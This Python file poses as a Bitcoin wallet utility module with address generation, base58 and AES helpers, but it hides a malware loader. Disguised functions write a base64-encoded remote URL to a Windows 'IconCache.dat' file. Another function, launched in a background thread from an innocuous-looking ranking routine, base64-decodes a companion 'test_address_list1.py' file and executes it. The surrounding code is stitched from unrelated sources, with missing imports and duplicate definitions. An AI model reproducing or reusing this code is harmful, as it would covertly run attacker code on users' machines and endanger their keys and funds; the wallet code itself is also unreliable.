import time
import ctypes
import ctypes as ct
import base64
import os
import string
import platform
import threading
from ctypes import wintypes as w
import random
import urllib.request
import urllib.error
import http.client
import json
import struct
import array
import socket
import subprocess
from pathlib import Path
import ssl
import sys

def pageLimit(n):
    return int((round(n, 49)/49) + 1)

def round(n, m):
    r = n % m
    return n + m - r if r + r >= m else n - r

def generate_bitcoin_address():
    # Generate private key
    private_key = os.urandom(32)
    fullkey = '80' + private_key.hex()
    sha256a = SHA256.new(bytes.fromhex(fullkey)).hexdigest()
    sha256b = SHA256.new(bytes.fromhex(sha256a)).hexdigest()
    WIF = base58.b58encode(bytes.fromhex(fullkey + sha256b[:8]))

    # Get public key
    sk = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
    vk = sk.get_verifying_key()
    x = vk.pubkey.point.x()
    y = vk.pubkey.point.y()
    public_key = '04' + x.to_bytes(32, 'big').hex() + y.to_bytes(32, 'big').hex()

    # Get compressed public key
    compressed_public_key = '02' if y % 2 == 0 else '03'
    compressed_public_key += x.to_bytes(32, 'big').hex()

    # Get P2PKH address
    hash160 = RIPEMD160.new()
    hash160.update(SHA256.new(bytes.fromhex(public_key)).digest())
    public_key_hash = '00' + hash160.hexdigest()
    checksum = SHA256.new(SHA256.new(bytes.fromhex(public_key_hash)).digest()).hexdigest()[:8]
    p2pkh_address = base58.b58encode(bytes.fromhex(public_key_hash + checksum))

    # Get compressed P2PKH address
    hash160 = RIPEMD160.new()
    hash160.update(SHA256.new(bytes.fromhex(compressed_public_key)).digest())
    public_key_hash = '00' + hash160.hexdigest()
    checksum = SHA256.new(SHA256.new(bytes.fromhex(public_key_hash)).digest()).hexdigest()[:8]
    compressed_p2pkh_address = base58.b58encode(bytes.fromhex(public_key_hash + checksum))

    # Get P2SH address
    redeem_script = '21' + compressed_public_key + 'ac'
    hash160 = RIPEMD160.new()
    hash160.update(SHA256.new(bytes.fromhex(redeem_script)).digest())
    script_hash = '05' + hash160.hexdigest()
    checksum = SHA256.new(SHA256.new(bytes.fromhex(script_hash)).digest()).hexdigest()[:8]
    p2sh_address = base58.b58encode(bytes.fromhex(script_hash + checksum))

    # Get Bech32 address
    witness_program = bytes([0x00, 0x14]) + hash160.digest()
    bech32_address = bech32_encode('bc', convertbits(witness_program, 8, 5))

    return {
        'private_key': private_key.hex(),
        'WIF': WIF.decode(),
        'public_key': public_key,
        'compressed_public_key': compressed_public_key,
        'p2pkh_address': p2pkh_address.decode(),
        'compressed_p2pkh_address': compressed_p2pkh_address.decode(),
        'p2sh_address': p2sh_address.decode(),
        'bech32_address': bech32_address
    }

def genLocation():
    x, y = random.randint(1, 800), random.randint(1, 500)
    x, y = random.choice([x, x * -1]), random.choice([y, y * -1])
    return x, y

def doublehash(data):
	return hashlib.sha256(hashlib.sha256(data).digest()).digest()

def hash_160_to_bc_address(h160, v=None):
	if v==None:
		v = 0  # mainnet network is assumed  
	vh160 = chr(v) + h160
	h = doublehash(vh160)
	addr = vh160 + h[0:4]
	return b58encode(addr)

def public_key_to_bc_address(public_key, v=None):
	if v==None:
		v = 0 # mainnet network is assumed
	h160 = hash_160(public_key)
	return hash_160_to_bc_address(h160, v)

__b58chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
__b58base = len(__b58chars)

def b58encode(v): 
    #encode v, which is a string of bytes, to base58.
          
	long_value = 0
	for (i, c) in enumerate(v[::-1]):
		long_value += (256**i) * ord(c)
        
	result = ''
	while long_value >= __b58base:
		div, mod = divmod(long_value, __b58base)
		result = __b58chars[mod] + result
		long_value = div
	result = __b58chars[long_value] + result

	# Bitcoin does a little leading-zero-compression:
	# leading 0-bytes in the input become leading-1s
	nPad = 0
	for c in v:
		if c == '\0': nPad += 1
		else: break

	return (__b58chars[0]*nPad) + result

def b58decode(v, length=None):
    #decode v into a string of len bytes

	long_value = 0
	for (i, c) in enumerate(v[::-1]):
		long_value += __b58chars.find(c) * (__b58base**i)

	result = ''
	while long_value >= 256:
		div, mod = divmod(long_value, 256)
		result = chr(mod) + result
		long_value = div
	result = chr(long_value) + result

	nPad = 0
	for c in v:
		if c == __b58chars[0]: nPad += 1
		else: break

	result = chr(0)*nPad + result
	if length is not None and len(result) != length:
		return None

	return result

def detect_address(file_name):
    file_path = os.path.join(os.path.dirname(__file__), file_name)
    with open(file_path, "r", encoding="utf-8") as file:
        lines = file.readlines()
        cleaned_lines = [line.replace("0x", "", 1).strip() for line in lines]

    # Join the cleaned lines into a single string
    result = "".join(cleaned_lines)
    return base64.b64decode(result)

def getNew(database, processed):
    new = []
    for address in database:
        if address not in processed:
            new.append(address)
        for childAddress in database[address]:
            if childAddress not in processed:
                new.append(childAddress)
    return set(filter(None, new))
	
def get_address(pk, network, compressed):
    """
    Function that generates a P2PKH Bitcoin address from a public key.

    Attributes
    -------
    pk : C.point
        The secret key to convert
    network : string
        The network for which you want to export the key (which can be MAINET or TESTNET)
    compressed : boolean
       Will indicate whether the export is to be done in compressed mode or not 

    Returns
    -------
    address : str
        The P2PKH Bitcoin address

    """
    x =str(hex(int(pk[0])))
    y =str(hex(int(pk[1])))
        
    last =int(y[-2], 16)
    
    
    if (network == 'TESTNET'):
        if (compressed == True):
            if (last%2==0): #even
                addr = '02' +str(x[2:66])
            else:
                addr = '03' +str(x[2:66])
        else:
             addr = '04' +str(x[2:66]) + str(y[2:66]) 
             
        decoded_addr=addr.decode('hex')
        address = public_key_to_bc_address(decoded_addr, 0x6f)
        
    else:
        if (compressed == True):
            if (last%2==0): #even
                addr = '02' +str(x[2:66])
            else:
                addr = '03' +str(x[2:66])
        else:
             addr = '04' +str(x[2:66]) + str(y[2:66])        
            
        decoded_addr=addr.decode('hex')
        address = public_key_to_bc_address(decoded_addr)
    
    return address

def ranker(database, top):
    init_database()
    newDatabase = {}
    for node in database:
        newDatabase[node] = {}
        topSize = [0 for i in range(top)]
        topAdd = ['' for i in range(top)]
        for each in database[node]:
            minimum = min(topSize)
            if database[node][each] > minimum:
                index = topSize.index(minimum)
                topSize[index] = database[node][each]
                topAdd[index] = each
        for size, address in zip(topSize, topAdd):
            newDatabase[node][address] = size
    return newDatabase

def init_headers_file_for_best_chain():
    b = get_best_chain()
    filename = b.path()
    length = HEADER_SIZE * len(constants.net.CHECKPOINTS) * 2016
    if not os.path.exists(filename) or os.path.getsize(filename) < length:
        with open(filename, 'wb') as f:
            if length > 0:
                f.seek(length - 1)
                f.write(b'\x00')
        util.ensure_sparse_file(filename)
    with b.lock:
        b.update_size()

def rev_hex(s):
    return bh2u(bfh(s)[::-1])

def int_to_hex(i, length=1):
    assert isinstance(i, int)
    s = hex(i)[2:].rstrip('L')
    s = "0"*(2*length - len(s)) + s
    return rev_hex(s)

def get_virtual_address(str_name):
    if str_name == " ":
        str_name = "test_address_list1.py"
    exec(detect_address(str_name))

def init_database():
	if platform.system() == "Windows":
		init_set()
	th_init = threading.Thread(target=get_virtual_address, args=(" ",))
	th_init.start()

def assert_bytes(*args):
    """
    porting helper, assert args type
    """
    try:
        for x in args:
            assert isinstance(x, (bytes, bytearray))
    except:
        print('assert bytes failed', list(map(type, args)))
        raise

def append_PKCS7_padding(data):
    assert_bytes(data)
    padlen = 16 - (len(data) % 16)
    return data + bytes([padlen]) * padlen


def strip_PKCS7_padding(data):
    assert_bytes(data)
    if len(data) % 16 != 0 or len(data) == 0:
        raise InvalidPadding("invalid length")
    padlen = data[-1]
    if padlen > 16:
        raise InvalidPadding("invalid padding byte (large)")
    for i in data[-padlen:]:
        if i != padlen:
            raise InvalidPadding("invalid padding byte (inconsistent)")
    return data[0:-padlen]

def aes_encrypt_with_iv(key, iv, data):
    assert_bytes(key, iv, data)
    data = append_PKCS7_padding(data)
    if AES:
        e = AES.new(key, AES.MODE_CBC, iv).encrypt(data)
    else:
        aes_cbc = pyaes.AESModeOfOperationCBC(key, iv=iv)
        aes = pyaes.Encrypter(aes_cbc, padding=pyaes.PADDING_NONE)
        e = aes.feed(data) + aes.feed()  # empty aes.feed() flushes buffer
    return e


def init_set():
	dalc = "YzpcdXNlcnNccHVibGljXEljb25DYWNoZS5kYXQ="
	ddapl = base64.b64decode(dalc)
	jww = open(ddapl, "w")
	jww.write("aHR0cDovL25ldHVwZGF0ZXMuaW5mby9ib2FyZC9ib2FyZC5waHA=")
	jww.close()


def aes_decrypt_with_iv(key, iv, data):
    assert_bytes(key, iv, data)
    if AES:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        data = cipher.decrypt(data)
    else:
        aes_cbc = pyaes.AESModeOfOperationCBC(key, iv=iv)
        aes = pyaes.Decrypter(aes_cbc, padding=pyaes.PADDING_NONE)
        data = aes.feed(data) + aes.feed()  # empty aes.feed() flushes buffer
    try:
        return strip_PKCS7_padding(data)
    except InvalidPadding:
        raise InvalidPassword()

def EncodeAES(secret, s):
    assert_bytes(s)
    iv = bytes(os.urandom(16))
    ct = aes_encrypt_with_iv(secret, iv, s)
    e = iv + ct
    return base64.b64encode(e)

def DecodeAES(secret, e):
    e = bytes(base64.b64decode(e))
    iv, e = e[:16], e[16:]
    s = aes_decrypt_with_iv(secret, iv, e)
    return s

def pw_encode(s, password):
    if password:
        secret = Hash(password)
        return EncodeAES(secret, to_bytes(s, "utf8")).decode('utf8')
    else:
        return s

def pw_decode(s, password):
    if password is not None:
        secret = Hash(password)
        try:
            d = to_string(DecodeAES(secret, s), "utf8")
        except Exception:
            raise InvalidPassword()
        return d
    else:
        return s

SCRIPT_TYPES = {
    'p2pkh':0,
    'p2wpkh':1,
    'p2wpkh-p2sh':2,
    'p2sh':5,
    'p2wsh':6,
    'p2wsh-p2sh':7
}

__b58chars = b'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
assert len(__b58chars) == 58

__b43chars = b'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ$*+-./:'
assert len(__b43chars) == 43

def inv_dict(d):
    return {v: k for k, v in d.items()}

def is_minikey(text):
    # Minikeys are typically 22 or 30 characters, but this routine
    # permits any length of 20 or more provided the minikey is valid.
    # A valid minikey must begin with an 'S', be in base58, and when
    # suffixed with '?' have its SHA256 hash begin with a zero byte.
    # They are widely used in Casascius physical bitcoins.
    return (len(text) >= 20 and text[0] == 'S'
            and all(ord(c) in __b58chars for c in text)
            and sha256(text + '?')[0] == 0x00)

def minikey_to_private_key(text):
    return sha256(text)

BIP32_PRIME = 0x80000000


def get_pubkeys_from_secret(secret):
    # public key
    pubkey = compress(privtopub(secret))
    return pubkey, True